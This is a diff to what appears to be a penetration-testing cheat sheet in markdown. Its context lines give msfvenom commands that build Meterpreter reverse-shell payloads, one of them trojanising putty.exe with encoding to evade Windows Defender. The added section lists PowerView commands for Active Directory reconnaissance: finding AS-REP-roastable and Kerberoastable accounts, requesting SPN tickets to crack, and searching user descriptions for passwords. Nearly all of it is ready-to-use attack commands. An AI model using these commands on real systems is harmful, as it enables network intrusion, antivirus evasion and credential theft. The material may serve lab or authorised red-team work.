@@ -17,6 +17,7 @@
 - [11. MSSQLPwner](#MSSQLPwner)
 - [12. NTLM Relay](#NTLM-Relay)
 - [13. MSFVenom Payload Generation](#MSFVenom-Payload-Generation)
+- [13. Domain Enumeration](#Domain Enumeration)
 
 
 # Tunneling - Ligolo-NG
@@ -295,3 +296,29 @@ impacket:
 | Putty.exe WinDef Bypass         | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.175 LPORT=8443 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o /mnt/Projects/test4.exe -e x64/xor_dynamic -i 10 -x ./putty.exe -k` |     |     |
 | 64bit Staged Shellcode          | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                        
 | 64bit NonStaged Shellcode       | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`                                                                                                        
+
+# Domain Enumeration
+
+### Domain/DC Information
+- `Get-NetDomain` - Query basic domain info  
+- `Get-NetDomain -Domain megacorp.com` - Query basic info on another domain.  
+- `Get-NetDomainController` - More info about the DC, IP Included.  
+- `Get-NetDomainController -Domain megacorp.com` - More info about another DC, IP Included.  
+- `Get-DomainSID` - Get the domain SID.
+- `Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local` - Get specific user info including their SID.
+- `Get-DomainPolicy` - Get domain policy information.
+
+### Domain Users/Groups Enumeration
+
+-   `Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount` - Basic user enabled info
+-   `Get-NetUser | select samaccountname` - Get the whole AD users.
+-   `Get-NetUser | select cn` - Get the whole domain users.
+-   `Get-NetUser | select cn,description` - All user's description.
+-   `Find-UserField -SearchField description -SearchTerm "built"`
+-   `Get-DomainUser -PreauthNotRequired -verbose | select samaccountname` - ASREPRoastable users. (GetNPUsers)
+-   `Get-NetUser -SPN` - Kerberoastable users
+-   `Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"` - Crack SPN password.
+-   `Get-UserProperty -Properties description` - all descriptions for all users.
+-   `Find-UserField -SearchField Description -SearchTerm "password"` - Search for the "password" string in the user's description.
+-   `Get-NetGroup -GroupName *admin*` - Show all groups has the `admin` word in it.
+-   `Get-NetGroupMember -Identity "Domain Admins" -Recurse` - Get all domain admins in the domain.
